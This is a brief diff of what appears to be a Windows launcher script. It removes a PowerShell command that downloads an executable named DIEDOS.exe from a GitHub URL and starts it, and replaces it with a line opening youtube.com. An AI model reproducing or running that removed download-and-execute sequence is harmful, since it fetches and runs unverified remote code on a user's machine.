@@ -1,5 +1,1 @@
-powershell -command "Invoke-WebRequest -Uri 'https://github.com/wwwqr-000/launchcontrolw/raw/main/Client%20Resources/DIEDOS.exe' -OutFile DIEDOS.exe"
-timeout 3
-start DIEDOS.exe
-exit
-
+start https://youtube.com
